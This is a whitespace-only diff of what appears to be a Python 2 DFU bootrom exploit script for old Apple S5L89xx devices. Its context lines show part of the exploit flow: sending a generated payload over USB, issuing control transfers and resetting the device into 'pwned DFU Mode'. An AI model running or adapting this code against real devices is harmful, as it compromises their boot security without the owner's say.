@@ -4,7 +4,7 @@ import array, ctypes, struct, sys, time
 import usb # pyusb: use 'pip install pyusb' to install this module
 import dfu
 
-# Must be global so garbage collector never frees it 
+# Must be global so garbage collector never frees it
 request = None
 transfer_ptr = None
 
@@ -179,7 +179,7 @@ def exploit():
     if 'PWND:[' in device.serial_number:
         print 'Device is already in pwned DFU Mode. Not executing exploit.'
         return
-    
+
     chosenConfig = None
     for config in configs:
         if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
@@ -193,7 +193,7 @@ def exploit():
                 sys.exit(1)
         print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
         sys.exit(1)
-    
+
     dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
 
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
@@ -210,7 +210,7 @@ def exploit():
 
     dfu.usb_reset(device)
     dfu.release_device(device)
-    
+
     device = dfu.acquire_device()
     dfu.request_image_validation(device)
     dfu.release_device(device)
@@ -226,3 +226,4 @@ def exploit():
         sys.exit(1)
 
     print 'Device is now in pwned DFU Mode.'
+
